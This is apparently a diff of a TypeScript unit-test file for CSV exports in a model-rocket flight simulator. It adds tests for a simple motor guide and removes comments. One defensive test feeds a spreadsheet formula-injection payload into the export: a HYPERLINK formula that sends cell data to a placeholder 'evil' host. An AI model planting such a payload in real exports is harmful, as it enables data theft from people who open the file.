@@ -5,15 +5,16 @@ import {
   flightEventsCsv,
   runTableCsv,
   motorGuideCsv,
+  simpleGuideCsv,
 } from '../../../src/services/exports/csvExport';
 import type { GuideRow } from '../../../src/services/flight/motorGuide';
+import type { SimpleGuideRow } from '../../../src/services/flight/simpleRocket';
 import { METRIC_UNITS, IMPERIAL_UNITS, UNITS } from '../../../src/prefs/units';
 import type { FlightResult, AeroSweep } from '../../../src/engine/openRocketEngine';
 import en from '../../../src/i18n/locales/en.json';
 import de from '../../../src/i18n/locales/de.json';
 import { localeTranslator } from '../../testing/localeTranslator';
 
-/** A locale's `t`, with i18next's `context` variants (`_rail`, `_rod`). */
 const tFor = (bundle: unknown) => {
   const base = localeTranslator(bundle);
   return (key: string, vars?: Record<string, unknown>): string => {
@@ -48,7 +49,6 @@ const result = {
   ],
 } as unknown as FlightResult;
 
-/** Names the way the dialog does, so headers read as a person would write them. */
 const named = (c: { key: string }) =>
   (
     ({
@@ -71,8 +71,6 @@ describe('flightDataCsv', () => {
   });
 
   it('writes only the columns asked for, in column order', () => {
-    // Not the order they were listed in: a file whose columns shuffle depending
-    // on how the boxes were ticked is a file nobody can script against.
     const csv = flightDataCsv(result, METRIC_UNITS, {
       ...opts,
       columns: ['velocity', 'time'],
@@ -94,7 +92,6 @@ describe('flightDataCsv', () => {
     });
     const rows = csv.split('\r\n');
     expect(rows[0]).toBe('# Time (s),Altitude (m),Mass (g)');
-    // kg -> g, so 0.05 reads as 50.
     expect(rows[1]).toBe('0.0,0.0,50.0');
   });
 
@@ -187,7 +184,6 @@ describe('flightDataCsv', () => {
   });
 
   it('renders a null or non-finite sample as an empty cell', () => {
-    // Blank, not zero: a gap in the series is not a measurement of nothing.
     const r = {
       series: { time: [0, 1], altitude: [null, NaN] },
       events: [],
@@ -203,8 +199,6 @@ describe('flightDataCsv', () => {
   });
 
   it('offers the horizontal track, in the distance unit', () => {
-    // Without these columns the file carries altitude and nothing horizontal,
-    // which makes a landing point unanswerable from the CSV.
     const drifted = { ...result, series: { ...result.series, Px: [0, 30], Py: [0, -40] } } as unknown as FlightResult;
     const csv = flightDataCsv(drifted, IMPERIAL_UNITS, {
       ...opts,
@@ -220,8 +214,7 @@ describe('flightDataCsv', () => {
   });
 
   it('writes air temperature as a reading, with the unit offset applied', () => {
-    // 288.15 K is 15 °C and 59 °F (C = K - 273.15, F = C * 9/5 + 32). A column
-    // multiplier alone would write 288.15 and 518.67.
+    // Temperature has an offset: a multiplier alone would write 288.15 and 518.67.
     const r = { series: { time: [0], T: [288.15] }, events: [] } as unknown as FlightResult;
     const write = (units: typeof METRIC_UNITS) =>
       flightDataCsv(r, units, {
@@ -254,7 +247,6 @@ const sweep = {
 describe('aeroTableCsv', () => {
   it('includes the Cd_powerOn column and sanitizes component header names', () => {
     const lines = aeroTableCsv(sweep, METRIC_UNITS).split('\r\n');
-    // Brackets stripped; the comma is kept and the field quoted, so it stays one column.
     expect(lines[0]).toBe('Mach,Cd,Cd_friction,Cd_pressure,Cd_base,Cd_powerOn,CP (cm),CNalpha (/rad),"Cd_Nose1,x"');
     expect(fields(lines[0]!)).toHaveLength(9);
     expect(lines[1]).toBe('0.500,0.5,0.1,0.2,0.2,0.6,22.3,2,0.05');
@@ -269,16 +261,10 @@ describe('aeroTableCsv', () => {
   it('converts the CP column and names the unit it used', () => {
     const lines = aeroTableCsv(sweep, IMPERIAL_UNITS).split('\r\n');
     expect(lines[0]!.includes('CP (in)')).toBe(true);
-    // 0.223 m = 8.779527559... in
     expect(lines[1]!.split(',')[6]).toBe('8.779528');
   });
 });
 
-/**
- * The events export. Where `flightDataCsv` can carry events as comment lines
- * for a reader, this answers the other question: give me the events as data.
- */
-/** Split one CSV line into fields, respecting quotes, as a reader does. */
 function fields(line: string): string[] {
   const out: string[] = [];
   let cur = '';
@@ -344,8 +330,6 @@ describe('flightEventsCsv', () => {
       'Time (s),Event,Source,Stage,Altitude (m),Velocity (m/s),Stability (cal),Thrust/weight,Angle of attack (°),Mach,Dynamic pressure (hPa)',
     );
     expect(lines[2]).toBe('0.300,"Rail departure",,"Sustainer",1.5,20,1.8,12,1,0.06,');
-    // Landing has no stability, TWR, AoA, Mach or q - those cells are empty
-    // rather than zero, because it does not have them rather than having 0.
     expect(lines[3]).toBe('40.000,"Landing","Main","Stage 2",0,4.5,,,,,');
   });
 
@@ -364,7 +348,6 @@ describe('flightEventsCsv', () => {
     expect(title).toBe(`# ${de.csv.head.simulationLine.replace('{{name}}', 'C6')}`);
     expect(head!.startsWith(`${de.csv.head.time} (s),${de.csv.head.event},${de.csv.head.source},`)).toBe(true);
     expect(head).not.toMatch(/Event|Altitude|Velocity/);
-    // The caliber unit is a word, and German abbreviates it differently.
     expect(head).toContain(`${de.csv.head.stability} (${de.stability.caliber})`);
     expect(head).not.toContain('(cal)');
   });
@@ -386,18 +369,11 @@ describe('flightEventsCsv', () => {
     );
     const body = csvText.trim().split('\r\n')[1]!;
     expect(body).toContain('"Booster, lower"');
-    // Eleven columns still, not twelve: the comma inside the quotes is data.
     expect(fields(body).length).toBe(11);
     expect(fields(body)[3]).toBe('Booster, lower');
   });
 
-  /**
-   * Spreadsheet formula injection. Every name column here is file-sourced:
-   * `source` is the kernel's component name, straight out of an imported
-   * `.ork`, and `stage` falls back to the branch name. Excel and Sheets strip
-   * the RFC-4180 quoting before evaluating, so quoting alone does not stop a
-   * crafted name executing when the export is opened.
-   */
+  // Excel and Sheets strip RFC-4180 quoting before evaluating, so quoting alone does not stop a formula.
   it('neutralizes a formula-triggering name rather than only quoting it', () => {
     const csvText = flightEventsCsv(
       [{ ...rows[0]!, source: '=HYPERLINK("http://evil/?"&A1,"Open")', branchName: '+1+1' }],
@@ -407,10 +383,8 @@ describe('flightEventsCsv', () => {
       (r) => r.branchName,
     );
     const body = csvText.trim().split('\r\n')[1]!;
-    // The apostrophe is inside the quoting, so the cell reads as text.
     expect(fields(body)[2]).toBe('\'=HYPERLINK("http://evil/?"&A1,"Open")');
     expect(fields(body)[3]).toBe("'+1+1");
-    // Still the same column count: the prefix is not a new field.
     expect(fields(body).length).toBe(11);
   });
 
@@ -467,9 +441,7 @@ describe('runTableCsv', () => {
     const cells = a!.split(',');
     expect(cells.slice(0, 4)).toEqual(['"C6"', '"Estes C6-5"', '"Estes C6-5"', '"Up to date"']);
     expect(Number(cells[4])).toBeCloseTo(1000, 6);
-    // One turn a second, by magnitude.
     expect(Number(cells[cells.length - 1])).toBeCloseTo(1, 6);
-    // A simulation that never flew is still listed, with no figures.
     expect(b!.startsWith('"Never flown","D12","Estes D12-5","Not run",')).toBe(true);
     expect(
       b!
@@ -495,11 +467,6 @@ describe('runTableCsv', () => {
     expect(head).not.toMatch(/Apogee|Max velocity|Configuration/);
   });
 
-  /**
-   * q·α is Pa·rad in SI, the product of the pressure and angle quantities, so
-   * the column reads in the user's pressure unit times their angle unit, as
-   * every other column follows the user's units.
-   */
   it('writes max q·α in the pressure unit times the angle unit, for every pair', () => {
     const gusty = {
       ...flown,
@@ -513,7 +480,6 @@ describe('runTableCsv', () => {
       },
       events: [{ type: 'APOGEE', time: 7.5 }],
     } as unknown as FlightResult;
-    // q = 1/2 * 1.2 * 170^2 = 17,340 Pa, times 0.1 rad: 1,734 Pa·rad.
     const paRad = 0.5 * 1.2 * 170 * 170 * 0.1;
     for (const p of UNITS.pressure) {
       for (const a of UNITS.angle) {
@@ -555,7 +521,7 @@ describe('motorGuideCsv', () => {
     railMargin: 1.8,
     railTwr: 9.2,
     deployVelocity: 8,
-    landingVelocity: null,
+    landingVelocity: null as number | null,
     optimumDelay: 6.6,
     warnings: [],
     deployEvents: [],
@@ -577,12 +543,10 @@ describe('motorGuideCsv', () => {
     expect(head).toContain('Thrust/weight');
     const cells = line!.split(',');
     expect(cells.slice(0, 3)).toEqual(['"F67W"', '"AeroTech"', '"7"']);
-    // The motor's own figures, in the reader's units: 70 N·s and 63.6 N in pounds-force.
     expect(Number(cells[3])).toBeCloseTo(70 / 4.4482216152605, 3);
     expect(Number(cells[4])).toBeCloseTo(63.6 / 4.4482216152605, 3);
     expect(cells.slice(5, 7)).toEqual(['1.1', '6.6']);
     expect(Number(cells[7])).toBeCloseTo(1000, 6);
-    // No landing figure: a blank cell, not a zero.
     expect(cells[cells.length - 2]).toBe('');
     expect(cells[cells.length - 1]).toBe('"Slow off the launcher"');
   });
@@ -591,5 +555,55 @@ describe('motorGuideCsv', () => {
     const head = motorGuideCsv([], METRIC_UNITS, tFor(de), 'rail').split('\r\n')[0]!;
     expect(head.startsWith(`${de.csv.head.motor},${de.csv.head.manufacturer},`)).toBe(true);
     expect(head).toContain(`${de.csv.head.exitVelocity_rail} (m/s)`);
+  });
+});
+
+describe('simpleGuideCsv', () => {
+  const figures = {
+    railExit: 15,
+    railTwr: 9.2,
+    maxAcceleration: 50,
+    burnoutTime: 1.6,
+    burnoutAltitude: 40,
+    apogee: 304.8,
+    maxVelocity: 100,
+    maxMach: 0.29,
+    timeToApogee: 7.5,
+    optimumDelay: 5.9,
+    railStability: 1.8,
+    deployVelocity: null as number | null,
+    landingVelocity: null as number | null,
+    flightTime: null as number | null,
+  };
+  const guideRow = (f: Partial<typeof figures>) =>
+    ({
+      key: 'k',
+      motor: { designation: 'C6', impulse: 10, burn: 1.6, avgThrust: 6 },
+      spec: { ejectionDelay: 5 },
+      figures: { ...figures, ...f },
+      nearest: 5,
+    }) as unknown as SimpleGuideRow;
+  const line = (f: Partial<typeof figures>) =>
+    simpleGuideCsv(
+      [{ motor: 'C6', manufacturer: 'Estes', delay: '5', status: '', row: guideRow(f) }],
+      METRIC_UNITS,
+      tEn,
+    )
+      .trimEnd()
+      .split('\r\n');
+
+  it('writes the climb, in the chosen units, under the design guide’s headings', () => {
+    const [head, cells] = line({});
+    expect(head!.startsWith('Motor,Manufacturer,Delay (s),Total impulse (N·s),')).toBe(true);
+    expect(head).toContain('Apogee (m)');
+    expect(head).toContain('Margin at exit (cal)');
+    expect(cells!.split(',').slice(0, 3)).toEqual(['"C6"', '"Estes"', '"5"']);
+  });
+
+  it('writes the descent only for a guide flown under a parachute', () => {
+    expect(line({})[0]).not.toContain('Landing velocity');
+    const [head, cells] = line({ deployVelocity: 4, landingVelocity: 5.4, flightTime: 30 });
+    expect(head).toContain('Deployment velocity (m/s),Landing velocity (m/s),Flight time (s),Status');
+    expect(cells!.split(',').slice(-4)).toEqual(['4', '5.4', '30', '""']);
   });
 });
